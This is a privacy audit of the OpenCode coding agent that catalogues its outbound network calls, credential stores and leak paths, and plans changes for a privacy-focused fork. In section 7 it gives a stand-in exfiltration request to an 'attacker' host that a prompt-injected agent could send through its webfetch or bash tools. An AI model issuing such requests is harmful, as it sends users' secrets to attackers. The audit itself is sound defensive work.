# Hermit Audit of Upstream OpenCode

**Baseline:** `anomalyco/opencode` commit `adee738d1e`, branch `dev`, opencode 1.18.32, audited 2026-09-25. All paths are repo-relative. Line numbers are as of this commit. Every claim below was verified by reading the code path, not documentation.

## 1. Architecture map (what matters for privacy)

The shipped `opencode` binary is one Bun-compiled executable built by `packages/opencode/script/build.ts` from `packages/opencode/src/index.ts`. It bundles these workspace packages: `core`, `llm`, `plugin`, `protocol`, `schema`, `server`, `tui`, `sdk`, `codemode`, `script`. At the audited commit it also embedded the web UI from `packages/app` as static files; `13-strip.md` has since deleted that and every package not in the binary.

Layers that matter:

- **Config** `packages/opencode/src/config/config.ts` merges global, project, env, console-pushed, and well-known remote config, and triggers a background npm install per config dir.
- **Catalog** `packages/core/src/models-dev.ts` loads the provider/model catalog from disk cache, else the build-time snapshot `OPENCODE_MODELS_DEV`, else `https://models.opencode.ai/api.json`. It also forks an hourly refresh.
- **Provider registry (V1)** `packages/opencode/src/provider/provider.ts` merges catalog + config + env + `auth.json` + built-in plugin loaders into the provider list, resolves an AI SDK instance per model, and wraps `fetch` with timeouts. `@ai-sdk/openai-compatible` is statically bundled (`provider.ts:123`).
- **Provider registry (V2)** `packages/core/src/catalog.ts` with per-provider plugins in `packages/core/src/plugin/provider/*.ts`, registered in `packages/core/src/plugin/provider.ts` and `packages/core/src/plugin/internal.ts`. Both V1 and V2 are live; V2 feeds the HTTP API and the OpenCode integration.
- **Session LLM** `packages/opencode/src/session/llm.ts` builds the request (`session/llm/request.ts`), and calls AI SDK `streamText` by default. A native runtime in `packages/llm` is opt-in via `OPENCODE_EXPERIMENTAL_NATIVE_LLM`.
- **Tools** `packages/opencode/src/tool/*` and `packages/core/src/tool/*`. Permissions default to `"*": "allow"` (`packages/opencode/src/agent/agent.ts:119-120`).
- **Server** `packages/opencode/src/server/*`, local Hono app. The plain TUI uses an in-process transport at `http://opencode.internal` and opens no TCP listener (`cli/cmd/tui.ts:233-249`).
- **Build snapshot** `packages/opencode/script/generate.ts:10-13` fetches `models.dev/api.json` at build time and embeds it, so the binary can list providers offline.

## 2. llama.cpp integration, verified

There is no llama.cpp-specific code. The documented setup (`packages/web/src/content/docs/providers.mdx:1430-1462`) is a custom provider in `opencode.json`:

```json
{
  "provider": {
    "llama.cpp": {
      "npm": "@ai-sdk/openai-compatible",
      "options": { "baseURL": "http://127.0.0.1:8080/v1" },
      "models": { "qwen3-coder": { "limit": { "context": 128000, "output": 65536 } } }
    }
  }
}
```

Path: `provider.ts:1481-1578` turns the config entry into a provider, defaulting `npm` to `@ai-sdk/openai-compatible` (`:1490-1497`). `resolveSDK` (`provider.ts:1732-1863`) sets `options.baseURL` from config (`:1757-1776`), sets `includeUsage` (`:1753`), wraps `fetch` with header and chunk timeouts (`:1794-1824`), and instantiates the bundled `createOpenAICompatible` (`:1826-1834`). No npm install, no catalog dependency, no OpenCode host. Requests go straight to the configured `baseURL` via Bun `fetch`. Tool calling is the standard OpenAI-compatible `tools` array via AI SDK; `toolcall` defaults to `true` for config models (`:1524`).

Headers added to every request, including to llama.cpp (`session/llm/request.ts:187-204`): `x-session-affinity: <sessionID>`, `X-Session-Id: <sessionID>`, `User-Agent: opencode/<version>`, and `x-parent-session-id` for subagents. Harmless on loopback.

Title generation uses `provider.getSmallModel(providerID)`, which only searches the same provider (`provider.ts:1939-2005`, caller `session/prompt.ts:218-221`). Compaction does not use the small model: it uses the `compaction` agent's model override if set, else the session's model (`session/compaction.ts:359-361`). Subagents use the parent's model or the agent's configured override. So a llama.cpp session never silently calls another provider today, with three explicit exceptions that the inference policy in `10` must cover: `small_model` config, per-agent `model` overrides in agent config, and the plugin hook `experimental.provider.small_model` (`packages/plugin/src/index.ts:297`) which can substitute any model for title generation.

**Verdict:** local inference already works and already keeps model context on the machine. What violates `docs/privacy-model.md` is the application egress around it (section 5.1) and the OpenCode-hosted provider present by default (section 4).

## 3. Fireworks integration, verified

Fireworks exists only as a catalog entry, id `fireworks-ai`, `env: ["FIREWORKS_API_KEY"]`, `npm: "@ai-sdk/openai-compatible"`, `api: "https://api.fireworks.ai/inference/v1/"` (from the models.dev snapshot; verified in the local cache `~/.cache/opencode/models.json`). Loading path: `provider.ts:1580-1591` enables it when `FIREWORKS_API_KEY` is set, or `:1593-1603` when `auth.json` has an `api` entry from `opencode auth login`. Then the same `resolveSDK` path as llama.cpp, with `apiKey` from the key (`:1777`). There is also a native-runtime profile `packages/llm/src/providers/openai-compatible-profile.ts:11` but it is only used under the experimental native flag.

**No OpenCode intermediary.** Requests go from the binary to `api.fireworks.ai`. The only OpenCode-bound inference traffic is the `opencode` provider itself (Zen gateway, `https://opencode.ai/zen/v1`).

Data sent to Fireworks beyond the prompt: the session ID headers above and the `opencode/<version>` User-Agent. Nothing else.

## 4. Is any OpenCode-hosted intermediary involved?

Not for llama.cpp or Fireworks inference. But an OpenCode-hosted provider is present by default: `provider.ts:185-207` autoloads the `opencode` provider with `apiKey: "public"` whenever the catalog contains free (cost 0) Zen models, with no key and no login. The same is done in V2 at `packages/core/src/plugin/provider/opencode.ts:174-186`. With no config it can become the default model (`provider.ts:2029-2041`, priority list at `:2047` includes the Zen model `big-pickle`), and the model picker always shows it. Once `cfg.provider` is set, `defaultModel` restricts to configured providers, but a `model.json` recent entry can still select Zen.

## 5. Every outbound network surface, categorized

Legend, per `docs/privacy-model.md`: **I** inference egress (carries model context), **A** application egress (Hermit itself contacting a service, no user action), **T** tool or user-requested network access (visible through tools, commands, or explicit config), **C** required for core agent functionality. Unauthorized inference or application egress violates the acceptance contract in `.plan/README.md`. Tool egress (**T**) follows the separately documented permissions model in `docs/privacy-model.md` section 7 and stays unless it also fits **A**. Trigger states whether it runs with no user action.

### 5.1 Automatic at startup or periodic

| #   | Surface                                                                          | Location                                                                                                                                                                               | Destination                                                     | Trigger                                        | Class | Existing switch                                       |
| --- | -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- | ---------------------------------------------- | ----- | ----------------------------------------------------- |
| A1  | Model catalog fetch and hourly refresh                                           | `packages/core/src/models-dev.ts:160-181,255-258`                                                                                                                                      | `models.opencode.ai`                                            | every start unless cache < 5 min; every 60 min | A     | `OPENCODE_DISABLE_MODELS_FETCH`; snapshot still works |
| A2  | Update check and silent patch self-upgrade                                       | `packages/opencode/src/cli/upgrade.ts:8-53`, scheduled `cli/cmd/tui.ts:266`, endpoints `installation/index.ts:208-264`, upgrade runs `https://opencode.ai/install` via `sh` `:144-165` | github.com, registry.npmjs.org, brew, choco, scoop, opencode.ai | 1 s after TUI start                            | A     | `OPENCODE_DISABLE_AUTOUPDATE`, `autoupdate: false`    |
| A3  | Bootstrap npm install of `@opencode-ai/plugin` into every `.opencode` config dir | `packages/opencode/src/config/config.ts:452-470` via `packages/core/src/npm.ts:88-121`                                                                                                 | registry.npmjs.org                                              | every config load, detached fork               | A     | none. Not gated by `OPENCODE_PURE`                    |
| A4  | OpenCode Zen provider autoload with public key                                   | `provider.ts:185-207`; `core/src/plugin/provider/opencode.ts:174-186`                                                                                                                  | opencode.ai/zen                                                 | provider init, no login                        | I, A  | `disabled_providers: ["opencode"]`                    |
| A5  | Console-pushed remote config                                                     | `config/config.ts:492-530`, `account/account.ts:216-245,364-385`                                                                                                                       | account URL, default `opencode.ai/console`                      | every config load when logged in               | A     | logout only                                           |
| A6  | V2 OpenCode integration config fetch                                             | `core/src/plugin/provider/opencode.ts:95-108,199-221`                                                                                                                                  | `opencode.ai/console/api/config`                                | plugin host start when connected               | A     | none                                                  |
| A7  | Well-known remote config loop                                                    | `config/config.ts:370-409`; created by `cli/cmd/providers.ts:324-352`, which also executes a command from the remote JSON (`:334`)                                                     | user URL                                                        | every config load when an auth entry exists    | A     | remove auth entry                                     |
| A8  | Copilot, GitLab, Modal, DigitalOcean model discovery                             | `plugin/github-copilot/copilot.ts:62-77`; `provider.ts:671-681,1658-1661`; `plugin/modal/models.ts:51-56`; `plugin/digitalocean.ts:170-177`                                            | vendor hosts                                                    | provider init when a credential exists         | A     | remove credential                                     |
| A9  | Remote MCP servers and MCP OAuth                                                 | `packages/opencode/src/mcp/index.ts:271-279,240-260`                                                                                                                                   | user URLs                                                       | instance start when configured                 | T     | per-entry config                                      |
| A10 | Remote skills                                                                    | `skill/discovery.ts:40-65`; `core/src/skill/discovery.ts:87-102`                                                                                                                       | `skills.urls`                                                   | startup when configured                        | T     | none beyond not configuring                           |
| A11 | Reference repositories clone/fetch                                               | `core/src/reference.ts:94`, `repository-cache.ts:177-195`                                                                                                                              | `references[].repository`                                       | system-prompt build when configured            | T     | none                                                  |
| A12 | OTLP log and trace export                                                        | `core/src/observability/otlp.ts:50-77`                                                                                                                                                 | `OTEL_EXPORTER_OTLP_ENDPOINT`                                   | continuous when env set                        | A     | off unless env set                                    |

### 5.2 Per provider turn

| #   | Surface                                                                                 | Location                                                                                                                                           | Class        | Note                                                                   |
| --- | --------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ---------------------------------------------------------------------- |
| B1  | AI SDK `streamText` to configured `baseURL`                                             | `session/llm.ts:280`; `provider.ts:1794-1834`                                                                                                      | I, C         | The inference boundary; destination is whatever the user configured    |
| B2  | Session ID and User-Agent headers to every provider                                     | `session/llm/request.ts:187-204`                                                                                                                   | A (metadata) | Adds `x-opencode-project`, `x-opencode-request` for opencode providers |
| B3  | Native runtime via `packages/llm`                                                       | `session/llm/native-runtime.ts:75-146`; `packages/llm/src/route/transport/http.ts:104-121`                                                         | I            | opt-in, same destinations                                              |
| B4  | Codex WebSocket path                                                                    | `plugin/openai/ws.ts:72-91`, gate `plugin/index.ts:62-73`                                                                                          | I            | on for non-prod channels                                               |
| B5  | Attribution headers `HTTP-Referer: https://opencode.ai/`, `X-Title`, OS fingerprint UAs | `provider.ts:472-504,609,631,764,834,887,899`; `core/src/plugin/provider/{openrouter,vercel,kilo,nvidia,llmgateway,zenmux,gitlab,cloudflare-*}.ts` | A (metadata) | only to those gateways                                                 |
| B6  | Remote `instructions[]` URLs                                                            | `session/instruction.ts:95-102,156-163`                                                                                                            | T            | every system-prompt build when configured                              |
| B7  | AI SDK `experimental_telemetry` spans with prompt content and `username`                | `session/llm.ts:208-222,344-351`                                                                                                                   | A            | needs `experimental.openTelemetry` and OTLP env                        |

### 5.3 Tool calls the model can make autonomously

| #   | Surface                                                                                  | Location                                                                                                              | Class                                        | Default                                                                                                                                  |
| --- | ---------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- | -------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| T1  | `webfetch` to any URL, no loopback or private-IP restriction, spoofed Chrome UA          | `packages/opencode/src/tool/webfetch.ts:35-90`; `core/src/tool/webfetch.ts:64-150`; registered `tool/registry.ts:108` | T                                            | **allowed without prompt** (`agent/agent.ts:119-120`)                                                                                    |
| T2  | `websearch` to `mcp.exa.ai` or `search.parallel.ai`, sends query, session id, model name | `tool/websearch.ts:30-95`, `tool/mcp-websearch.ts:4-7`                                                                | T, A (session id and model name to Parallel) | registered only for `opencode*` providers or `OPENCODE_ENABLE_EXA`/`PARALLEL`/`OPENCODE_EXPERIMENTAL` (`tool/registry.ts:58-65,293-295`) |
| T3  | `bash` tool                                                                              | `tool/bash.ts`                                                                                                        | C                                            | any shell command can reach the network; only OS enforcement covers this                                                                 |

### 5.4 First-use binary downloads

| #   | Surface                                               | Location                                                                                                                                                                                | Destination                           | Class                                    | Switch                                                             |
| --- | ----------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- | ---------------------------------------- | ------------------------------------------------------------------ |
| D1  | ripgrep                                               | `packages/core/src/ripgrep/binary.ts:94-118`                                                                                                                                            | github.com                            | A, C (grep/glob need `rg`)               | none; system `rg` on PATH avoids it                                |
| D2  | LSP servers, direct download                          | `packages/opencode/src/lsp/server.ts` (eslint :183, elixir :552, zls :600, clangd :976, jdtls :1207, kotlin :1297, lua :1405, terraform :1632, texlab :1705, tinymist :1877)            | github, eclipse, jetbrains, hashicorp | A (executable download, no user data)    | `OPENCODE_DISABLE_LSP_DOWNLOAD`, `lsp: false`                      |
| D3  | LSP servers via npm `Npm.which`                       | `lsp/server.ts` :125 typescript, :153 vue, :340 biome, :494 pyright, :1078 svelte, :1111 astro, :1370 yaml, :1524 intelephense, :1605 bash, :1783 dockerfile; `core/src/npm.ts:200-249` | registry.npmjs.org                    | A                                        | **bypasses** `OPENCODE_DISABLE_LSP_DOWNLOAD`; only `lsp` config    |
| D4  | Formatters via npm                                    | `format/formatter.ts:71-148`                                                                                                                                                            | registry.npmjs.org                    | T                                        | only when project `package.json` declares them; `formatter: false` |
| D5  | Config `plugin: [...]` npm packages                   | `plugin/shared.ts:207-212`; `core/src/config/plugin/external.ts:75-77`                                                                                                                  | registry.npmjs.org                    | T                                        | `OPENCODE_PURE`                                                    |
| D6  | Non-bundled provider `npm` packages                   | `provider.ts:1836-1850`                                                                                                                                                                 | registry.npmjs.org                    | T                                        | use bundled packages only                                          |
| D7  | Tree-sitter grammars on first highlight of a language | `packages/tui/src/parsers-config.ts:9-381`, fetched inside `@opentui/core` parser worker                                                                                                | github.com, raw.githubusercontent.com | A (grammar download, leaks language use) | none                                                               |

### 5.5 Explicit user commands and actions

| #   | Surface                                                                                      | Location                                                                                                                                                 | Destination                              |
| --- | -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| U1  | `opencode account login`, orgs, switch                                                       | `cli/cmd/account.ts`; `account/account.ts:387-431`                                                                                                       | `opencode.ai/console`                    |
| U2  | `opencode auth login` OAuth flows: Codex, Copilot, xAI, DigitalOcean, Snowflake, Azure       | `plugin/openai/codex.ts`, `plugin/github-copilot/copilot.ts`, `plugin/xai.ts`, `plugin/digitalocean.ts`, `plugin/snowflake-cortex.ts`, `plugin/azure.ts` | vendor auth hosts                        |
| U3  | `/share` and `opencode run --share`; full transcript, tool output, diffs streamed thereafter | `share/share-next.ts:51-71,120-199,206-222,274-299`; `share/session.ts`                                                                                  | `opncd.ai`, `enterprise.url`, or console |
| U4  | `opencode upgrade`                                                                           | `cli/cmd/upgrade.ts`                                                                                                                                     | as A2                                    |
| U5  | `opencode github install/run`, `opencode pr`                                                 | `cli/cmd/github.handler.ts:325,485,697,1062-1157`; `cli/cmd/pr.ts`                                                                                       | `api.opencode.ai`, github                |
| U6  | `opencode import <url>`                                                                      | `cli/cmd/import.ts:129-142`                                                                                                                              | share host                               |
| U7  | `opencode plug`                                                                              | `cli/cmd/plug.ts`                                                                                                                                        | npm                                      |
| U8  | `opencode mcp auth`                                                                          | `mcp/oauth-provider.ts`, `mcp/oauth-callback.ts`                                                                                                         | MCP auth server                          |
| U9  | Worktree reset `git fetch`                                                                   | `worktree/index.ts:555-561`                                                                                                                              | git remote                               |
| U10 | Browser opens: docs, `opencode.ai/go` upsell, crash-report issue URL                         | `tui/src/app.tsx:824`, `tui/src/component/dialog-retry-action.tsx:24`, `tui/src/component/error-component.tsx:202-238`                                   | browser                                  |

### 5.6 Inbound and proxy

| #   | Surface                                                                                                  | Location                                                                | Note                                                 |
| --- | -------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- | ---------------------------------------------------- |
| S1  | Local HTTP server                                                                                        | `server/server.ts:73-124`, `cli/network.ts:7-16`                        | binds `127.0.0.1`, random port; TUI does not need it |
| S2  | UI reverse proxy to `app.opencode.ai` when embedded bundle missing or `OPENCODE_DISABLE_EMBEDDED_WEB_UI` | `server/shared/ui.ts:9,44-49,78-108`                                    | forwards request headers                             |
| S3  | mDNS advertisement, binds `0.0.0.0`                                                                      | `server/mdns.ts`, `cli/network.ts:17-26`                                | off by default                                       |
| S4  | Remote workspace proxy                                                                                   | `httpapi/middleware/workspace-routing.ts`, `control-plane/workspace.ts` | experimental flag, plugin adapter only               |

### 5.7 Confirmed absent

No PostHog, Sentry, or analytics SDK in `opencode`, `core`, `llm`, or `tui`. No crash upload. `$schema` URLs are strings, never fetched. `packages/opencode/src/sync` is local event sourcing with no HTTP. `Ide.install` (`ide/index.ts:40`) is dead code.

## 6. Authentication and account inventory

- **OpenCode console account**: device-code OAuth against `https://opencode.ai/console` (`cli/cmd/account.ts:18`; `account/account.ts:137,220,287,300,370,390,419`). Stored in SQLite tables `account`, `account_state` (`packages/core/src/account/sql.ts:6-22`) in `$XDG_DATA_HOME/opencode/opencode.db`. Unlocks console-managed provider config (A5), org-scoped share, and Go billing. Exposed over the local API at `httpapi/handlers/experimental.ts:43-80`.
- **V2 integration** `core/src/plugin/provider/opencode.ts` duplicates the same OAuth for the V2 catalog and adds an "API key (service account)" method.
- **Provider credentials**: V1 `$XDG_DATA_HOME/opencode/auth.json` mode 0600 (`packages/opencode/src/auth/index.ts:10,79`), types `oauth`, `api`, `wellknown` (`:14-35`). V2 `credential` table (`core/src/credential/sql.ts`). No credential leaves for a host other than its provider, except the `wellknown` type which re-fetches a remote URL on every start (A7).
- **Built-in auth plugins loaded without config** (`plugin/index.ts:66-84`, disable `OPENCODE_DISABLE_DEFAULT_PLUGINS`): Codex, Copilot, Modal, GitLab, Poe, Cloudflare, Azure, DigitalOcean, Snowflake, xAI, Cerebras. Network only inside login flows or when a credential exists, except Copilot's models fetch (A8).

## 7. Things that can leak a local session's data

Ranked by likelihood in a configured local-inference install. Items 1 and 2 are tool egress, kept visible through permissions per `docs/privacy-model.md` section 7; they are listed because the audit brief asked for every path, not because Hermit removes them.

1. **`webfetch` allowed by default** (T1). A local model can be prompted, or prompt-injected through a file it reads, into `GET https://attacker/?q=<secrets>`. Nothing restricts destination. This is the most realistic exfiltration path.
2. **`bash` tool** (T3). `curl` and friends. Only OS enforcement closes this.
3. **Session sharing** (U3) if `share: "auto"` or `OPENCODE_AUTO_SHARE` is ever set: full transcript, tool output, and diffs to `opncd.ai`.
4. **Console remote config** (A5, A6) if logged in: the server can rewrite provider `api` URLs, headers, and options on every start. A logged-in account is a remote-control channel over where prompts go.
5. **Well-known remote config** (A7): same class, plus executes a remote-specified command at login.
6. **Zen provider present by default** (A4): one wrong pick in the model dialog sends the session to opencode.ai. Not silent, but one keystroke away.
7. **OTLP telemetry** (A12, B7): off by default, but when on it ships prompt content and `username`.
8. **Metadata**: session IDs to every provider (B2), OS release and arch in some UAs (B5), catalog fetch UA with version, channel, and client (A1), Parallel websearch receiving session id and model name (T2), crash-report URL with error text (U10).
9. **Filenames**: LSP downloads (D2, D3) are triggered by file extensions, so which languages a project uses leaks by which servers get downloaded. Tree-sitter (D7) likewise per rendered language.

## 8. Minimum change set under explicit egress

The target is `docs/privacy-model.md`: no hidden application egress, no hosted intermediary, one visible inference boundary with no fallback, ordinary tool networking preserved. The smallest set that achieves it:

| Step | Change                                                                                                                              | Files                                                                                                                                                                                     | Risk to core                                                                                   |
| ---- | ----------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| M1   | Stop the catalog fetch and hourly refresh; rely on the build-time snapshot plus config                                              | `core/src/models-dev.ts`                                                                                                                                                                  | none; snapshot is already the fallback                                                         |
| M2   | Delete update check and self-upgrade                                                                                                | `cli/upgrade.ts`, `cli/tui/worker.ts:59-62`, `cli/cmd/tui.ts:266`, `cli/cmd/upgrade.ts`, `installation/index.ts:144-321`, `httpapi/handlers/global.ts:88-98`, `tui/src/app.tsx:1033-1050` | none                                                                                           |
| M3   | Delete the automatic bootstrap npm install per config dir. Keep `Npm` for explicit `plugin: [...]` entries                          | `config/config.ts:452-470`                                                                                                                                                                | local `.opencode/plugin/*.ts` importing `@opencode-ai/plugin` need a documented manual install |
| M4   | Remove the OpenCode Zen provider and its public-key autoload                                                                        | `provider.ts:185-207`; `core/src/plugin/provider/opencode.ts`; `core/src/plugin/provider.ts`; snapshot filter in `script/generate.ts`                                                     | none                                                                                           |
| M5   | Delete accounts, console-pushed config, well-known remote config, and the remote-command login                                      | `account/*`, `core/src/account/*`, `cli/cmd/account.ts`, `config/config.ts:370-409,492-530`, `cli/cmd/providers.ts:324-352`, `httpapi/handlers/experimental.ts:43-80`                     | regenerate client                                                                              |
| M6   | Delete share transport                                                                                                              | `share/*`, `core/src/share/*`, share routes, TUI `/share`, `run --share`, `cli/cmd/import.ts`                                                                                             | regenerate client                                                                              |
| M7   | Delete OTLP export and AI SDK telemetry wiring                                                                                      | `core/src/observability/otlp.ts`, `session/llm.ts:208-222,344-351`, `agent/agent.ts:381-395`                                                                                              | none                                                                                           |
| M8   | Strip identifying request metadata: session ID headers, `HTTP-Referer: opencode.ai`, OS fingerprints; `User-Agent: hermit/<v>`      | `session/llm/request.ts:187-204`; provider header sites                                                                                                                                   | none                                                                                           |
| M9   | Delete the `app.opencode.ai` UI proxy, the `api.opencode.ai` GitHub-app command, and Zen upsells                                    | `server/shared/ui.ts:78-108`, `cli/cmd/github*.ts`, `session/retry.ts`, `tui/src/component/dialog-provider.tsx`, `dialog-retry-action.tsx`                                                | none                                                                                           |
| M10  | Bundle `rg`; make `OPENCODE_DISABLE_LSP_DOWNLOAD` also cover the npm `Npm.which` paths                                              | `core/src/ripgrep/binary.ts`, `script/build.ts`, `lsp/server.ts`                                                                                                                          | none once bundled                                                                              |
| M11  | `websearch`: keep as an explicitly configured tool, drop the `opencode` provider gate, stop sending session id and model name       | `tool/websearch.ts:73-77`, `tool/registry.ts:58-65,293-295`                                                                                                                               | none                                                                                           |
| M12  | Inference boundary: provider trust classification, no-fallback assertion, trust level shown in the TUI status line and model picker | new `packages/opencode/src/hermit/*`, `session/llm.ts`, `tui` status                                                                                                                      | none                                                                                           |

Kept deliberately, as tool or user-requested network access: `webfetch`, remote `instructions[]` URLs, `skills.urls`, `references[].repository`, user-configured MCP servers and MCP OAuth, config `plugin: [...]` npm installs, LSP and formatter downloads (with the flag fixed), tree-sitter grammars, `bash`, `git`.

## 9. Proposed implementation sequence

Each step ends with a typechecking, runnable binary. Regions map to plan files.

Phases follow `.plan/README.md` section 4: contract and inventory, harness with baseline failures, then implementation with assertions added per region, then the full matrix, then branding and discretionary removals.

0. **Strip** (`13`): Tier 1 first, Tier 2 if the TUI-only decision is confirmed. Line references below are unaffected by Tier 1.
1. **Contract and inventory** (`README.md`, `10` section 3.0).
2. **Verification harness** (`11`): fake server, recording proxy, scenarios, baseline run against the unmodified binary. Expect S1, S5, S6, S8, S9 to fail.
3. **Inference policy** (`10`): M12. Turns S1, S3, S5, S7-S13 green.
4. **Catalog and providers** (`01`): M1, M4, M8.
5. **Update and install** (`04`): M2 (startup check and silent self-upgrade only; the explicit command body is phase 9).
6. **Plugins and npm** (`05`): M3.
7. **Accounts and remote config** (`02`): M5. Regenerate client.
8. **Share** (`03`): M6. Regenerate client.
9. **Telemetry** (`09`): M7.
10. **Server, UI, commands** (`08`): M9 (proxy fallback and GitHub-app command; mDNS and remote workspaces are discretionary, phase 13).
11. **Tools** (`06`): M11.
12. **Binaries and LSP** (`07`): M10.
13. **Full matrix** (`11`): all scenarios green, `coverage.md` written, CI job.
14. **Branding and discretionary removals** (`12`, then optional items in `04` and `08`) in separate commits.
15. **Docs**: `docs/upstream.md` section 4 from the divergence logs.

## 10. Removals that could break core functionality

- **Ripgrep** (M10): grep, glob, skill discovery, and the file API depend on `rg`. Bundle it before deleting the download.
- **`@opencode-ai/plugin` bootstrap** (M3): local TypeScript plugins need the package resolvable. Verify how `plugin/shared.ts` loads them from the binary; document a manual install if needed.
- **Catalog** (M1): keep `ModelsDev.Service` and the snapshot; remove only the fetch.
- **Share removal** (M6): `Session.Info.share` is referenced by TUI, HttpApi, and SDK. Remove the field or leave it inert; regenerate either way.
- **Account removal** (M5): remove the routes, not just handlers; regenerate.
- **Zen removal** (M4): `getSmallModel` and `catalog.ts` have `opencode`-specific branches; delete them with the provider.

## 11. Verification and external enforcement

Verification follows `docs/privacy-model.md` section 10 and is defined in `.plan/11-verification.md`. The core test runs a scripted session against a fake OpenAI-compatible server on loopback while recording every destination the process contacts, then asserts that the only inference destination is the configured endpoint and that no application-level destination outside an allowlist appears. Tool-driven destinations the script intentionally triggers are expected and asserted separately.

Container and firewall isolation is no longer the primary boundary. It remains documented as an optional strict deployment for users who want to enforce local-only operation externally, because application code cannot constrain `bash`.
